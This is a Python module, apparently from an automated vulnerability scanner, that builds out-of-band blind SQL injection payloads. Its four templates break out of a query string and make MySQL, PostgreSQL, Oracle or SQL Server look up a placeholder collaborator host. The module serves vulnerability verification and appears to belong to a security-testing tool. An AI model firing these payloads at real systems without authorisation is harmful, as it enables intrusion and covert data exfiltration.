"""Server-owned out-of-band (OOB) SQLi payloads for an observed string GET field.

Blind injection with no reflection, no error, and no timing margin can still be
proven if the database can be coerced into an outbound DNS/HTTP lookup to a fresh
collaborator. This module builds the *payload template* only; registration,
planting, bounded polling, and the register->plant->poll correlation proof are
owned by ``oob_callback_workflow`` and validated class-agnostically by
``proof_policy`` (kind ``oob_callback``), so OOB cannot yield a false positive —
either a correlated callback arrives or the claim stays inconclusive.

The model never supplies payload bytes: it selects a mapped, ordinary observed
input and a family; the template here embeds ``{{callback_host}}`` /
``{{callback_url}}`` placeholders that the workflow fills with the freshly
registered collaborator. A wrong family simply never calls back.
"""

from __future__ import annotations

from urllib.parse import unquote_plus, urlsplit

from .sqli_string import _SAFE_VALUE, _observed_value

OOB_FAMILIES = ("mysql", "postgresql", "oracle", "sqlserver")

# Each template breaks out of the observed string literal, triggers one
# family-specific outbound lookup to the collaborator, and comments out the tail.
# Host-based primitives (DNS/UNC) use {{callback_host}}; MySQL uses hex literals
# (0x5c5c = "\\", 0x5c61 = "\a") to avoid backslash-escaping ambiguity.
_TEMPLATES = {
    "mysql": "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c,'{{callback_host}}',0x5c61)))-- ",
    "postgresql": (
        "' AND 1=(SELECT 1 FROM dblink("
        "'host={{callback_host}} user=x dbname=x','SELECT 1') AS t(x int))-- "
    ),
    "oracle": (
        "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{callback_host}}') "
        "FROM dual) IS NOT NULL-- "
    ),
    "sqlserver": "'; EXEC master..xp_dirtree '\\\\{{callback_host}}\\aegis'-- ",
}


def observed_value(url: str, *, parameter: str) -> str:
    """Return the one ordinary observed value, or raise if it is not eligible."""
    parts = urlsplit(url)
    if parts.fragment or len(url) > 2048 or len(parts.query) > 2048:
        raise ValueError("A bounded fragment-free observed GET URL is required")
    fields = parts.query.split("&")
    if len(fields) > 40 or not isinstance(parameter, str) or not 0 < len(parameter) <= 80:
        raise ValueError("A single bounded query parameter is required")
    matches = [field for field in fields
               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
    if len(matches) != 1:
        raise ValueError("String parameter must occur exactly once")
    _name, sep, raw_value = matches[0].partition("=")
    value = _observed_value(raw_value)[0] if sep else ""
    if not _SAFE_VALUE.fullmatch(value):
        raise ValueError("OOB SQLi proof requires an ordinary observed string value")
    return value


def plan_oob_sqli(url: str, *, parameter: str, family: str) -> tuple[str, str]:
    """Build a server-owned query_template value for the OOB workflow.

    Returns ``(field, template)`` where ``template`` is the full replacement value
    for ``parameter`` (observed value preserved, payload appended, collaborator
    placeholder embedded). The caller passes it to run_oob_callback_workflow with
    ``location='query_template'``.
    """
    if family not in OOB_FAMILIES:
        raise ValueError("unsupported_sql_family")
    value = observed_value(url, parameter=parameter)
    template = value + _TEMPLATES[family]
    return parameter, template
